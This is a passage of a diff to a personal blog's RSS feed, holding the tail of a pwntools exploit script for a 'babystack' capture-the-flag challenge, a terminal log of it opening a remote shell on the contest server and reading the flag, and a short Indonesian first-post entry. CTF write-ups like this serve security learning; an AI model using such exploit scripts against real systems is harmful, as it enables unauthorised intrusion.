+	p<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+  
+    p <span style="color:#f92672">=</span> process(BINARY)
+
+    <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+    	<span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;d&#39;</span>:
+        	p <span style="color:#f92672">=</span> remote(HOST, PORT)
+        <span style="color:#66d9ef">else</span>:
+        	cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">        	&#39;&#39;&#39;</span>
+        	gdb<span style="color:#f92672">.</span>attach(p, cmd)
+    exploit()
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">@m00n ➜ babystack git:(master) ✗ python main.py x
+[+] Starting local process &#39;./main&#39;: pid 9060
+[+] Opening connection to 35.192.113.20 on port 3000: Done
+[*] Switching to interactive mode
+$ ls
+flag.txt
+main
+$ cat f*
+UNITYCTF2020{406b0e859139e5c897e2fdfb8f33634e}
+$ 
+</code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>Tulisan Pertama</title>
+            <link>https://fikriguska.github.io/posts/2020/03/tulisan-pertama/</link>
+            <pubDate>Mon, 16 Mar 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://fikriguska.github.io/posts/2020/03/tulisan-pertama/</guid>
+            <description>#Halo. Ini adalah tulisan pertama dari blog saya. Nantinya blog ini dipake untuk nulisin apa yang ada dipikiran saya, isinya bakal macem-macem ga cuman satu topik aja 😅, udah sih mungkin gitu aja wkwk</description>
+            <content type="html"><![CDATA[<h2 id="halo">#Halo.</h2>
+<p>Ini adalah tulisan pertama dari blog saya. Nantinya blog ini dipake untuk nulisin apa yang ada dipikiran saya, isinya bakal macem-macem ga cuman satu topik aja 😅, udah sih mungkin gitu aja wkwk</p>
+]]></content>
+        </item>
+        
+    </channel>
 </rss>
